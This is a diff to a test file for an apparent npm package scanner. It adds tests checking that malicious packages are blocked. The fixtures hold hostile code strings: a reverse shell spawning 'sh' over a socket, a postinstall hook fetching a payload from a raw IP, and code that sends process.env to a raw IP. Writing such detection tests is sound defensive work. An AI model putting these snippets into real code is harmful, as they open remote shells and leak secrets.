@@ -64,7 +64,7 @@ describe("false-positive corpus (must not block)", () => {
       changedScripts: {},
       scanFiles: [{ path: "index.js", text: "module.exports=function(){return '';};" }],
     },
-    // Real-world regressions (see Task_tracker/issues.md): these all FALSE-BLOCKED
+    // Real-world regressions (see task-tracker/issues.md): these all FALSE-BLOCKED
     // before recalibration because network/env capability was scored as exfil.
     "express-like (uses http + env, no raw IP)": {
       name: "express",
@@ -175,4 +175,62 @@ describe("true-positive corpus (must block for the right reason)", () => {
       expect(v.categories).toContain(category);
     });
   }
+});
+
+// --- Individual block policies not exercised by the corpus -------------------
+describe("block policy edge cases", () => {
+  test("reverse shell blocks even without an install script", () => {
+    const v = verdictFor({
+      name: "innocuous-logger",
+      version: "1.0.0",
+      isNewPackage: true,
+      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 40, ageDays: 2 },
+      addedScripts: {},
+      changedScripts: {},
+      scanFiles: [{ path: "index.js", text: "const net=require('net');const s=net.connect(4444,'h');const p=spawn('sh');s.pipe(p.stdin);" }],
+    });
+    expect(v.verdict).toBe("block");
+    expect(v.summary).toContain("reverse shell");
+  });
+
+  test("install script + raw-IP sink blocks (lifecycle sink correlation)", () => {
+    const v = verdictFor({
+      name: "fresh-miner",
+      version: "1.0.0",
+      isNewPackage: true,
+      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
+      addedScripts: { postinstall: "node payload.js" },
+      changedScripts: {},
+      scanFiles: [{ path: "payload.js", text: "require('https').get('http://185.62.1.9/payload');" }],
+    });
+    expect(v.verdict).toBe("block");
+    expect(v.summary).toContain("install-time script");
+  });
+
+  test("a lone install script on a non-established package warns, never blocks", () => {
+    const v = verdictFor({
+      name: "native-thing",
+      version: "1.0.0",
+      isNewPackage: true,
+      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 50, ageDays: 3 },
+      addedScripts: { postinstall: "node-gyp rebuild" },
+      changedScripts: {},
+      scanFiles: [],
+    });
+    expect(v.verdict).toBe("warn");
+  });
+
+  test("env dump sent to a raw IP blocks without any install script", () => {
+    const v = verdictFor({
+      name: "telemetry-helper",
+      version: "1.0.0",
+      isNewPackage: true,
+      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
+      addedScripts: {},
+      changedScripts: {},
+      scanFiles: [{ path: "index.js", text: "const b=JSON.stringify(process.env);fetch('http://185.62.1.9/c',{method:'POST',body:b});" }],
+    });
+    expect(v.verdict).toBe("block");
+    expect(v.summary).toContain("environment variables");
+  });
 });
